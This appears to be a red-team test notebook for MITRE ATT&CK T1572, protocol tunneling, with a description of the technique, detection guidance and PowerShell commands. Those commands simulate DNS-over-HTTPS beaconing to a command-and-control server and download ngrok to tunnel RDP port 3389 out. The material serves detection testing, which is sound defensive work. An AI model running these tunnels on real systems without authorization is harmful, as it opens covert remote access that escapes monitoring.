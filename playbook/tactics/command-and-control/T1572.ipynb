{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "efef9d2f",
   "metadata": {},
   "source": "# T1572 - Protocol Tunneling\nAdversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. "
  },
  {
   "cell_type": "markdown",
   "id": "b68e14de",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "6be5f748",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - DNS over HTTPS Large Query Volume",
    "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nfor($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\" -UseBasicParsing).Content }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ba2d36e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "65026b7e",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - DNS over HTTPS Regular Beaconing",
    "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36c03d06",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "22b858e2",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - DNS over HTTPS Long Domain Query",
    "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc87ac6f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "3395edfa",
   "metadata": {},
   "source": "### Atomic Test #4 - run ngrok\nDownload and run ngrok. Create tunnel to chosen port.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Download ngrok\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7a2c655",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "63bcf7e4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nC:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "490b4a8b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "725a3a18",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9202d602",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1572 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3ca40596",
   "metadata": {},
   "source": "## Detection\nMonitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)"
  },
  {
   "cell_type": "markdown",
   "id": "866830f1",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Network Monitoring \n Monitor network traffic in order to detect adversary activity. \n\n Network monitoring involves capturing network activity data, including capturing of server, firewall, and other relevant logs. A defender can then review them or send them to a centralized collection location for further analysis.\n#### Opportunity\nThere is an opportunity to monitor network traffic for different protocols, anomalous traffic patterns, transfer of data, etc. to determine the presence of an adversary.\n#### Use Case\nA defender can monitor for systems establishing connections using encapsulated protocols not commonly used together such as RDP tunneled over TCP.\n#### Procedures\nCapture network logs for internet-facing devices and send those logs to a central collection location.\nCapture all network  device (router, switches, proxy, etc.) logs on a decoy network and send those logs to a central collection location.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}